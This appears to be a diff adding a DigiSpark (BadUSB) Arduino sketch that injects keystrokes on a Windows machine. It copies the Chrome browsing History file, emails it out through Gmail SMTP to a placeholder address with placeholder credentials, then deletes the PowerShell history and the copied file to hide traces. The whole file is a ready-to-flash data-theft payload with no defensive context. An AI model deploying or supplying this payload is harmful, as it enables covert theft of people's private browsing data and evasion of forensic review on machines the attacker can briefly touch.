@@ -1,0 +1,52 @@
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+ 
+ DigiKeyboard.sendKeyStroke(0);
+ DigiKeyboard.delay(500);
+ DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+ DigiKeyboard.delay(500);
+ DigiKeyboard.print("cmd"); 
+ DigiKeyboard.sendKeyStroke(KEY_ENTER);
+ DigiKeyboard.delay(500);
+ DigiKeyboard.print("cd %UserProfile%/AppData/Local/Google/Chrome/User Data/Default/");
+ DigiKeyboard.delay(500); 
+ DigiKeyboard.sendKeyStroke(KEY_ENTER);
+ DigiKeyboard.print("copy History D:");
+ DigiKeyboard.sendKeyStroke(KEY_ENTER);
+ DigiKeyboard.delay(500); 
+ DigiKeyboard.print("exit");
+ DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print(F("powershell"));
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('Receiver-Email', 'password'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'sender-email@gmail.com'; $ReportEmail.To.Add('receiver-email@gmail.com'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('D://History'); $SMTPInfo.Send($ReportEmail);exit"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_A);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath;exit"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print(F("del History"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print(F("exit"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for(;;){ /*empty*/ }
+}
